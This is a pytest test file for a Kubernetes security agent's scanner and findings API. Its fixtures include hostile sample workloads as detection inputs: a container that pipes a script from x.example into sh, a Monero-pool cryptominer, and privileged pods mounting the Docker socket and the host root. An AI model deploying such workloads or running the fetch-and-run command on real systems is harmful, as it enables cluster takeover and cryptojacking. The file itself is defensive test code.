"""Kubernetes security: the agent's checks on pod specs and RBAC bindings, and findings on the control plane (lifecycle, alerts, access)."""
import importlib
import json
import os
import sys
import time

os.environ.setdefault("ENVIRONMENT", "test"); os.environ.setdefault("JWT_SECRET", "x" * 40); os.environ.setdefault("DATABASE_URL", "sqlite://")
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import pytest
from fastapi.testclient import TestClient

from test_api_auth import CSRF, HEALTHY, _k8s_register, _k8s_token, client, fresh_stats_cache, main, make_user, session_for, sign_in  # noqa: F401
from app import database
from app.models import AlertEvent

ROOT = os.path.dirname(os.path.dirname(__file__))


@pytest.fixture()
def k8s():
    sys.path.insert(0, ROOT)
    sys.modules.pop("k8s_agent", None)
    module = importlib.import_module("k8s_agent")
    yield module
    sys.modules.pop("k8s_agent", None)


def pod(name, ns="default", owner=None, spec=None, labels=None, annotations=None, phase="Running"):
    md = {"name": name, "namespace": ns, "creationTimestamp": "2026-11-18T09:00:00Z", "labels": labels or {}, "annotations": annotations or {}}
    if owner:
        md["ownerReferences"] = [{"kind": owner[0], "name": owner[1]}]
    return {"metadata": md, "spec": spec or {"containers": [{"name": "app", "image": "nginx:1.27"}]}, "status": {"phase": phase}}


def test_agent_flags_dangerous_workloads_once_per_workload(k8s, monkeypatch):
    rs = ("ReplicaSet", "web-5d8f7c9b6")
    risky = {"hostPID": True, "volumes": [{"name": "d", "hostPath": {"path": "/var/run/docker.sock"}}, {"name": "r", "hostPath": {"path": "/"}}],
             "containers": [{"name": "app", "image": "nginx:1.27", "securityContext": {"privileged": True, "capabilities": {"add": ["SYS_ADMIN", "CHOWN"]}}}]}
    pods = [pod("web-5d8f7c9b6-a", owner=rs, spec=risky, labels={"pod-template-hash": "5d8f7c9b6"}),
            pod("web-5d8f7c9b6-b", owner=rs, spec=risky, labels={"pod-template-hash": "5d8f7c9b6"}),
            pod("miner-x", ns="tmp", owner=("DaemonSet", "sysupdate"), spec={"containers": [{"name": "m", "image": "45.9.1.2:5000/updater", "args": ["--url", "stratum+tcp://pool.minexmr.com:4444"]}]}),
            pod("shell", ns="tmp", spec={"containers": [{"name": "s", "image": "alpine", "command": ["sh", "-c", "curl -s http://x.example/a.sh | sh"]}]}),
            pod("kube-proxy-abc", ns="kube-system", owner=("DaemonSet", "kube-proxy"), spec={"hostNetwork": True, "containers": [{"name": "kp", "image": "k8s/kube-proxy", "securityContext": {"privileged": True}}]}),
            pod("sneaky", ns="kube-system"),
            pod("etcd-node1", ns="kube-system", annotations={"kubernetes.io/config.mirror": "x"}),
            pod("done", spec=risky, phase="Succeeded"),
            pod("plain", owner=("ReplicaSet", "api-77"), labels={"pod-template-hash": "77"})]
    bindings = {"/apis/rbac.authorization.k8s.io/v1/clusterrolebindings": [
        {"metadata": {"name": "ci-admin"}, "roleRef": {"name": "cluster-admin"}, "subjects": [{"kind": "ServiceAccount", "name": "deployer", "namespace": "ci"}]},
        {"metadata": {"name": "system-ok"}, "roleRef": {"name": "cluster-admin"}, "subjects": [{"kind": "ServiceAccount", "name": "x", "namespace": "kube-system"}]},
        {"metadata": {"name": "oops"}, "roleRef": {"name": "view"}, "subjects": [{"kind": "Group", "name": "system:unauthenticated"}]}],
        "/apis/rbac.authorization.k8s.io/v1/rolebindings": []}
    monkeypatch.setattr(k8s, "klist", lambda path, params=None, cap=0: (bindings[path], False))
    scan = k8s.security_scan(pods)
    by = {f["key"]: f for f in scan["findings"]}
    assert by["privileged:default/Deployment/web:app"]["severity"] == "high" and by["privileged:default/Deployment/web:app"]["pods"] == 2   # two replicas, one finding
    assert by["host_path:default/Deployment/web:"]["severity"] == "critical" and "runtime socket" in by["host_path:default/Deployment/web:"]["title"]
    assert "SYS_ADMIN" in by["capabilities:default/Deployment/web:app"]["title"] and "CHOWN" not in by["capabilities:default/Deployment/web:app"]["title"]
    assert by["host_pid:default/Deployment/web:"]["severity"] == "high"
    assert by["miner:tmp/DaemonSet/sysupdate:m"]["severity"] == "critical" and by["ip_registry:tmp/DaemonSet/sysupdate:m"]["severity"] == "medium"
    assert by["reverse_shell:tmp/Pod/shell:s"]["severity"] == "critical"
    kp = by["privileged:kube-system/DaemonSet/kube-proxy:kp"]
    assert kp["severity"] == "low" and "system namespace" in kp["title"]                                 # normal for cluster components
    assert by["bare_pod:kube-system/sneaky"]["severity"] == "high" and "bare_pod:kube-system/etcd-node1" not in by
    assert not any("done" in k or "api" in k for k in by)                                              # finished pods and clean workloads
    assert by["rbac_admin:ci-admin:ci/deployer"]["severity"] == "high" and not any("system-ok" in k for k in by)
    assert by["rbac_anonymous:ClusterRoleBinding//oops:system:unauthenticated"]["severity"] == "critical"
    assert scan["rbac_checked"] and scan["findings"][0]["severity"] == "critical"


def test_agent_without_rbac_permission_says_why(k8s, monkeypatch):
    def deny(path, params=None, cap=0):
        raise k8s.K8sError(403, "forbidden")
    monkeypatch.setattr(k8s, "klist", deny)
    scan = k8s.security_scan([])
    assert scan["rbac_checked"] is False and "re-apply the install manifest" in scan["rbac_error"]


def _finding(key, severity="high", **extra):
    return {"key": key, "kind": "k8s_privileged", "severity": severity, "title": f"{key} is risky", "detail": "because", "namespace": "default", "object": "Deployment/web", **extra}


def test_cluster_findings_lifecycle_alerts_and_access(client):
    sign_in(client)
    anon = TestClient(main.app)
    _, r = _k8s_register(client, anon, "sec-cluster")
    auth = {"Authorization": f"Bearer {_k8s_token(r.text)}"}
    sec = {"checked_at": "2026-11-18T10:00:00Z", "rbac_checked": True, "findings": [_finding("privileged:default/Deployment/web:app", container="app", image="nginx", pods=3),
                                                                                     _finding("miner:tmp/DaemonSet/x:m", "critical", command="xmrig\x1b[2J"), _finding("ip_registry:a/Pod/b:c", "medium")]}
    assert anon.post("/api/k8s-agent/report", json={**HEALTHY, "security": sec}, headers=auth).status_code == 200
    data = client.get("/api/security/kubernetes").json()
    assert [f["severity"] for f in data["findings"]] == ["critical", "high", "medium"]
    assert data["findings"][1]["evidence"] == {"container": "app", "image": "nginx", "pods": 3} and "\x1b" not in data["findings"][0]["evidence"]["command"]
    cluster = next(c for c in data["clusters"] if c["name"] == "sec-cluster")
    assert cluster["supported"] and cluster["scan"]["rbac_checked"] and cluster["scan"]["findings"] == 3
    with database.SessionLocal() as db:
        alerts = [a for a in db.query(AlertEvent).filter(AlertEvent.target_type == "cluster", AlertEvent.state == "threat").all() if a.target_id == cluster["id"]]
    assert len(alerts) == 1 and "Crypto" not in alerts[0].message and "miner:tmp" in alerts[0].message and "ip_registry" not in alerts[0].message   # one alert, serious ones only
    assert client.get("/api/security/overview").json()["kubernetes"]["critical"] == 1
    # same findings again: refreshed, no new alert; a finding that is gone resolves; acknowledging keeps it listed as known
    time.sleep(1.1)
    sec["findings"] = sec["findings"][:2]
    anon.post("/api/k8s-agent/report", json={**HEALTHY, "security": sec}, headers=auth)
    open_now = client.get("/api/security/kubernetes").json()["findings"]
    assert len(open_now) == 2 and client.get("/api/security/kubernetes?status=resolved").json()["findings"][0]["key"] == "ip_registry:a/Pod/b:c"
    fid = open_now[0]["id"]
    assert client.post(f"/api/security/kubernetes/{fid}/acknowledge", headers=CSRF, json={"note": "our own test miner"}).json()["acknowledged_by"]
    assert [f["id"] for f in client.get("/api/security/kubernetes?status=acknowledged").json()["findings"]] == [fid]
    with database.SessionLocal() as db:
        assert len([a for a in db.query(AlertEvent).filter(AlertEvent.target_type == "cluster", AlertEvent.state == "threat").all() if a.target_id == cluster["id"]]) == 1
    # an RBAC check that could not run does not resolve RBAC findings
    time.sleep(1.1)
    sec = {"checked_at": "x", "rbac_checked": True, "findings": [_finding("rbac_admin:b:ci/d", kind="k8s_rbac_cluster_admin")]}
    anon.post("/api/k8s-agent/report", json={**HEALTHY, "security": sec}, headers=auth)
    time.sleep(1.1)
    anon.post("/api/k8s-agent/report", json={**HEALTHY, "security": {"rbac_checked": False, "rbac_error": "forbidden", "findings": []}}, headers=auth)
    assert [f["key"] for f in client.get("/api/security/kubernetes").json()["findings"]] == ["rbac_admin:b:ci/d"]
    # viewers cannot read security findings
    make_user(client, "k8s-viewer@example.com", "viewer")
    v = session_for("k8s-viewer@example.com", new_password="k8s-viewer-pass-1")
    assert v.get("/api/security/kubernetes").status_code == 403
    assert anon.post("/api/k8s-agent/report", json={**HEALTHY, "security": {"findings": [{**_finding("x"), "kind": "bad kind"}]}}, headers=auth).status_code in (422, 429)
